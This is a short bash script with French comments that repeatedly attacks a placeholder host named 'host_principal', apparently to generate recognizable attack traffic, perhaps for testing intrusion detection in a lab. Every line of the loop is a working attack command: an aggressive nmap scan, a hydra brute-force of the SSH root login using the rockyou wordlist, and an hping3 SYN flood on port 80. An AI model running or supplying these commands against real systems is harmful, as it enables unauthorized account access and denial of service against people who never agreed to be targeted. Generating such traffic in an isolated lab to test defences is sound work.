#!/bin/bash

# Attaques plus reconnaissables
while true; do
    # Scan agressif
    echo "Lancement d'un scan agressif..."
    nmap -T5 -A -v -n host_principal
    
    # Bruteforce SSH
    echo "Tentative de bruteforce SSH..."
    hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -W 3 -f ssh://host_principal
    
    # Flood SYN
    echo "Début SYN flood..."
    hping3 -S --flood -p 80 host_principal &
    HPING_PID=$!
    sleep 30
    kill -9 $HPING_PID
    
    # Attente aléatoire avant la prochaine attaque
    sleep $((RANDOM%60+30))
done